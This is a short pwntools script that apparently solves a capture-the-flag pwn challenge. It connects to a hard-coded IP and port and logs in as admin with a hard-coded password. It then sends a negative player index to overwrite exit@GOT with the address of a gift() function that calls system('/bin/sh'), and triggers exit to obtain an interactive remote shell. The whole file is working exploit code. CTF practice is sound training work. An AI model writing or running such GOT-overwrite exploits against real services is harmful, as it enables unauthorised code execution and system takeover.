
from pwn import *

# Connection details
HOST = '23.146.248.136'
PORT = 31480

# The password you found earlier
PASSWORD = b'P@ssw0rd_8e2h58qt9tq5' 

# Address of the gift() function which calls system("/bin/sh")
GIFT_ADDRESS = 0x40129B

# The calculated index to overwrite exit@GOT
PLAYER_INDEX = -9

def solve():
    """
    Connects to the server, authenticates, and exploits the arbitrary
    write vulnerability to get a shell.
    """
    # Establish connection
    conn = remote(HOST, PORT)
    
    # --- Authentication ---
    log.info("Authenticating...")
    conn.recvuntil(b'Enter your username: ')
    conn.sendline(b'admin')
    conn.recvuntil(b'Enter your password: ')
    conn.sendline(PASSWORD)
    log.success("Authenticated successfully!")
    
    # --- Exploitation ---
    conn.recvuntil(b'Choice: ')
    
    # 1. Choose to edit a player
    log.info("Selecting option 2 to edit a player")
    conn.sendline(b'2')
    
    # 2. Send the malicious index
    conn.recvuntil(b'Which player index to edit? ')
    log.info(f"Sending malicious player index: {PLAYER_INDEX}")
    conn.sendline(str(PLAYER_INDEX).encode())
    
    # 3. Send the address of gift() as the new name
    #    p64() packs the address into a 64-bit little-endian byte string
    payload = p64(GIFT_ADDRESS)
    conn.recvuntil(b'New name: ')
    log.info(f"Sending payload (gift() address): {hex(GIFT_ADDRESS)}")
    conn.sendline(payload)
    
    # 4. Send any value for the score
    conn.recvuntil(b'New score: ')
    conn.sendline(b'1337')
    log.success("Payload sent! Overwrote exit@GOT with gift() address.")
    
    # --- Trigger the Shell ---
    conn.recvuntil(b'Choice: ')
    
    # 5. Choose to exit, which will now call gift() instead of exit()
    log.info("Selecting option 3 to trigger the shell...")
    conn.sendline(b'3')
    
    # --- Enjoy the shell ---
    log.success("Shell is waiting for you! 🐚")
    conn.interactive()

if __name__ == "__main__":
    solve()